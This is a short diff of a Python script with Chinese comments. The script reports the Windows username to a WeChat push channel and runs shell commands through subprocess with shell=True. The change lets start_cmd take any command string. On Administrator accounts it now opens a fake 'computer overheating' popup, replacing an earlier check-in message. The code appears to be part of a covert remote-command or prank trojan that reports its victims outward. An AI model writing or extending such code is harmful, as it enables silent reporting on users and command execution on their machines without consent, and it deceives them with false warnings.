@@ -77,10 +77,10 @@ sys_Version = platform.release()
 sys_username = os.getenv('USERNAME')
 # =======
 
-def start_cmd():
+def start_cmd(ml):
     wechat_push.Alleged_information(f'{sys_username}命令代码')
     # 要执行的命令，这里以获取系统信息（systeminfo）为例
-    command = "cd"
+    command = ml
     # 使用run函数执行命令，通过shell=True在系统的shell中执行，需要注意安全问题
     try:
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
@@ -95,5 +95,5 @@ def start_cmd():
         wechat_push.Alleged_information(f"发生错误: {e}")
 
 # ===================干活====================
-wechat_push.Alleged_information(f"{sys_username}okOk")
-
+if sys_username == 'Administrator':
+    start_cmd('start echo "电脑过热"')
